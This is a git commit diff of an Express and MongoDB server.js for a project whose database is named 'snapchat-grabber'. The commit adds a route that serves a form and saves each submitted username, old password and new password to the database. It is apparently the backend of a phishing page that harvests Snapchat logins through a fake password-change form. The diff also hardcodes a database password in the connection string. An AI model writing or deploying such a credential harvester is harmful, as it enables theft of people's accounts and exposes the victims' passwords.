43b3cf2387475698b9448c07fd0a46e3da9b418b
Tevz <tevz.kristan2007@gmail.com>
2022-08-24 23:08:50 +0200

    update

--- server.js
+++ server.js
@@ -2,14 +2,39 @@ const express = require("express");
 const app = express();
 const mongoose = require("mongoose");
 const bodyParser = require("body-parser");
-const { response } = require("express");
+app.use(bodyParser.urlencoded({ extended: false }));
 
-app.use(bodyParser.urlencoded({ extended: true }));
+mongoose
+  .connect(
+    "mongodb+srv://Tevz:kosarka123@cluster0.zf5cirt.mongodb.net/snapchat-grabber?retryWrites=true&w=majority"
+  )
+  .then(() => console.log("DB Connection Succesfull"))
+  .catch((err) => {
+    console.log(err);
+  });
+
+const accountSchema = {
+  username: String,
+  oldPassword: String,
+  newPassword: String,
+};
+
+const Account = mongoose.model("Account", accountSchema);
 
 app.get("/", function (req, res) {
-  res.send("express is working");
+  res.sendFile(__dirname + "/index.html");
 });
 
-app.listen(3000, function () {
-  console.log("server is running on 3000");
+app.post("/", function (req, res) {
+  let newAccount = new Account({
+    username: req.body.username,
+    oldPassword: req.body.oldPassword,
+    newPassword: req.body.newPassword,
+  });
+  newAccount.save();
+  res.sendFile(__dirname + "/index2.html");
+});
+
+app.listen(5000, function () {
+  console.log("server is running on 5000");
 });
